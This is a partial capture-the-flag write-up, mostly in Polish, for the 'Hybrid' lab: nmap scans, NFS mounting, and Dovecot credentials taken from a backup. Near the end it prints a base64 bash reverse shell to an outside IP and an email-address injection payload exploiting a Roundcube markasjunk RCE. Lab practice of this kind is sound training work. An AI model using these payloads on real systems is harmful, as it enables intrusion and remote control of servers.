# Hybrid
Chains, Windows, Easy, created by **xct**

we start with two IPs
10.10.145.117
10.10.145.118

```
nmap -Pn -A -v -p- --version-all -oA nmap -T4 10.10.145.117 10.10.145.118
sudo nmap -sU -Pn -A -F -v -oA nmaUDP 10.10.145.117 10.10.145.118
```

```
Nmap scan report for 10.10.145.117
Host is up (0.032s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
593/tcp   open  ncacn_http Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap       Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-17T16:39:23
| Not valid after:  2025-07-17T16:39:23
| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a
|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9
3269/tcp  open  ssl/ldap   Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-17T16:39:23
| Not valid after:  2025-07-17T16:39:23
| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a
|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
49664/tcp open  msrpc      Microsoft Windows RPC
49669/tcp open  msrpc      Microsoft Windows RPC

53/udp  open  domain?
| fingerprint-strings: 
|   DNS-SD: 
|     _services
|     _dns-sd
|     _udp
|_    local
123/udp open  ntp?
| ntp-info: 
|_  receive time stamp: 2024-11-29T12:04:40

```

```
Nmap scan report for 10.10.145.118
Host is up (0.030s latency).
Not shown: 65378 closed tcp ports (conn-refused), 142 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)
|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Redirecting...
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL STLS TOP CAPA UIDL RESP-CODES PIPELINING AUTH-RESP-CODE
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37519/tcp   mountd
|   100005  1,2,3      45205/tcp6  mountd
|   100005  1,2,3      46112/udp6  mountd
|   100005  1,2,3      57093/udp   mountd
|   100021  1,3,4      34607/tcp6  nlockmgr
|   100021  1,3,4      44401/tcp   nlockmgr
|   100021  1,3,4      55605/udp   nlockmgr
|   100021  1,3,4      59039/udp6  nlockmgr
|   100024  1          33233/tcp   status
|   100024  1          33629/tcp6  status
|   100024  1          42276/udp6  status
|   100024  1          56743/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more listed LOGINDISABLEDA0001 LITERAL+ Pre-login post-login STARTTLS capabilities IMAP4rev1 OK ENABLE SASL-IR have ID IDLE LOGIN-REFERRALS
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
587/tcp   open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more listed AUTH=LOGINA0001 LITERAL+ OK post-login IDLE capabilities IMAP4rev1 Pre-login AUTH=PLAIN SASL-IR have ID ENABLE LOGIN-REFERRALS
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
995/tcp   open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
|_pop3-capabilities: SASL(PLAIN LOGIN) USER TOP CAPA UIDL RESP-CODES PIPELINING AUTH-RESP-CODE
2049/tcp  open  nfs_acl  3 (RPC #100227)
33097/tcp open  mountd   1-3 (RPC #100005)
33233/tcp open  status   1 (RPC #100024)
37519/tcp open  mountd   1-3 (RPC #100005)
44401/tcp open  nlockmgr 1-4 (RPC #100021)
56547/tcp open  mountd   1-3 (RPC #100005)


9/udp     open|filtered discard
19/udp    open|filtered chargen
68/udp    open|filtered dhcpc
80/udp    open|filtered http
111/udp   open          rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      37519/tcp   mountd
|   100005  1,2,3      57093/udp   mountd
|   100021  1,3,4      44401/tcp   nlockmgr
|   100021  1,3,4      55605/udp   nlockmgr
|   100024  1          33233/tcp   status
|   100024  1          56743/udp   status
|_  100227  3           2049/tcp   nfs_acl
139/udp   open|filtered netbios-ssn
158/udp   open|filtered pcmail-srv
161/udp   open|filtered snmp
515/udp   open|filtered printer
626/udp   open|filtered serialnumberd
1023/udp  open|filtered unknown
1030/udp  open|filtered iad1
1646/udp  open|filtered radacct
2049/udp  open|filtered nfs
2223/udp  open|filtered rockwell-csp2
5060/udp  open|filtered sip
49152/udp open|filtered unknown
49193/udp open|filtered unknown
49201/udp open|filtered unknown

```

/etc/hosts
```
10.10.145.117 dc01.hybrid.vl 
10.10.145.118 mail01.hybrid.vl
```

 prosty chłopak jestem, widzę 2049 to puszczam showmounta.

 ![{7D7366BC-1FFD-4D4A-A707-3C0CDBEBA037}](https://github.com/user-attachments/assets/3199867f-294d-490c-9926-6438f576e948)

![{A957F612-5DD5-472B-80E4-DCB2669F9855}](https://github.com/user-attachments/assets/49d509d1-5889-41a6-ba7f-7202ca36f006)

```
 2067  cp /mnt/x/backup.tar.gz .
 2068  7z x backup.tar.gz
 2069  7z x backup.tar
```

```
ls -la opt/certs/hybrid.vl/
ls -la etc
```

![{F13EB37F-2B04-408F-AC0C-4220B23AC264}](https://github.com/user-attachments/assets/f085b1f6-1512-4326-b7f2-6dba28ffb656)

![{333BCFCC-DBFF-4350-B460-F4DA1E720198}](https://github.com/user-attachments/assets/633d0c29-39b0-4041-9add-4bebf9fa9dd4)

![{6641D9B1-0624-4FE5-8296-EAC00DABDE99}](https://github.com/user-attachments/assets/66dbac24-dd38-4a75-a12b-e1b7875bcf00)

```
vmail:x:5000:5000:virtual mail user:/var/mail/vhosts:/bin/sh

```
o ciekawe

```
cat etc/dovecot/dovecot-users
```
to dało nam username:password dwóch userów

```
admin@hybrid.vl:{plain}Du<coś tam. Zrób leniu>21
peter.turner@hybrid.vl:{plain}P<coś tam. Zrób leniu>l!
```

![{00951F59-0D33-4BB1-AB09-85A0E7765859}](https://github.com/user-attachments/assets/df640b81-f75e-4004-913e-fa22eecf7b17)

jako admin

![{EE0461A6-9F0F-403C-A120-0E32C46DFED8}](https://github.com/user-attachments/assets/3931c5f3-3727-458a-83b4-dd9776ab3393)


jako peter

![{4CD72901-5B2B-4D1C-8A4D-5A14319ED191}](https://github.com/user-attachments/assets/966d5489-d493-4eae-b19c-21c8b56a285d)

w sumie.. nic więcej

`https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/`

![{F1C8EBA2-D11C-468D-9E59-7CC967B9B99D}](https://github.com/user-attachments/assets/6f1aeb45-6f7c-4bcd-b1e4-61f4fb2f38ad)

```
echo "bash -c '/bin/bash -i >& /dev/tcp/10.8.4.124/9001 0>&1'" | base64
```

```
&echo${IFS}YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguNC4xMjQvOTAwMSAwPiYxJwo=|base64${IFS}-d|bash&@hybrid.vl
```

jakikolwiek mail do `junk`

![{EFD7636F-8158-463A-948D-9EA976623E52}](https://github.com/user-attachments/assets/fc94d885-2233-42be-8b52-07f93f4df703)

![{020A3500-15E1-4C94-9960-ECC6847E4694}](https://github.com/user-attachments/assets/14d9a9db-a4aa-4166-91e8-430cd5db10cd)

![{1DCB7A0E-F911-4F61-995D-9868AEEDC120}](https://github.com/user-attachments/assets/04ddb1eb-ede5-48c5-83d8-8ba2e90e0053)






